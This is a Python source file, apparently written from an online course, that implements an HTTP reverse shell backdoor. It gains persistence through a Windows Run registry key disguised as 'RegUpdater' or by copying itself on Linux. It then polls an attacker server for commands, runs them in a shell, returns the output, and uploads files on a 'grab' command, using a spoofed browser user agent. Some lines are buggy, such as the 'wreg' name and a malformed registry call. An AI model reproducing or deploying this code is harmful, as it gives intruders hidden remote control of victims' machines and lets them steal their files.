#############################################################################
# 1. Yes, I know the # box is annoying to most. I like it. Deal             #
# 2. There is a script following a tutorial from a Udemy course, with some  #
#    needed changes (like he uses placeholder.txt for in the server file    #
#    as the name to write the file to). Don't be picky, I wrote the shit for#
#    fun and learning.                                                      #
# 3. A big change from the course is the platform.system() additions. I work#
#    on a linux machine. That being said, there are some things that don't  #
#    import, like winreg. That is a windows only thing. So, if you plan to  #
#    use this on a windows target, build on a windows machine or the        #
#    script will break. I also recommend using pyinstaller to make the exe  #
#    file. At the end of the day, read what the code says, you should be    #
#    able to figure out what you need to do. Thanks, hope you enjoy!        #
#############################################################################

import requests
import subprocess
import os
import platform
import time # will be used for 3 second sleep
import shutil
import random
if platform.system() == "Windows":
    import winreg
    path = os.getcwd().strip('/n')
    Null, userprof = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE).decode().split("=")
    destination = userprof.strip('/r/n')+'\\Documents\\'+'client.exe'
    if not os.path.exists(destination):
        shutil.copyfile(path+'\client.ext', destination)
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination))
        key.Close()


elif platform.system() == "Linux":
    path = os.getcwd().strip('/n')
    username = os.getenv("USER")
    destination = "/home/{}/Documents/".format(username)
    if not os.path.exists(destination):
        print('{} Does not exist.'.format(destination))
    else:
        if not os.path.exists(destination+"/http_client_shell.py"):
            shutil.copy("/"+path+'/http_client_shell.py', destination)
        else:
            print("Persistent file already present.")

    print(os.path.exists(destination+'http_client_shell.py'))

    print(path, destination)
elif platform.system() == "Darwin":
    path = os.getcwd().strip('/n')
    print(path)
else:
    print("What did I fuck up now")

user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36' # use this to change useragent. Currently set to basic ass user agents

ip = "192.168.0.11" # use server IP
port = 8080 # use whatever port you set the server to accept connections on
host = 'http://{}:{}'.format(ip, port)

def connect():
    while True:
        req = requests.get(host, headers={'User-Agent':user_agent})
        command = req.text
        if 'terminate' in command:
            return 1
        elif 'grab' in command:
            grab, path = command.split(' ')
            if os.path.exists(path):
                url = '{}/store'.format(host)
                files = {'file':open(path, 'rb')}
                r = requests.post(url, files=files)
            else:
                post_response = requests.post(url=host, data='[-] File not found')
        elif 'help' in command:
            post_response = requests.post(url=host, data="""
HTTP Simple Reverse Shell Help Menu
Close shell: terminate
Close server: ctrl+c
more features to come""")
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
            post_response = requests.post(url='http://192.168.0.11:8080', data=CMD.stdout.read())
            post_response = requests.post(url='http://192.168.0.11:8080', data=CMD.stderr.read())


while True:
    try:
        if connect() == 1:
            break
    except:
        sleep_for = random.randint(1,10)
        # print("Sleeping for {} seconds".format(sleep_for)) put in for debug purposes lol
        time.sleep(int(sleep_for))
        pass
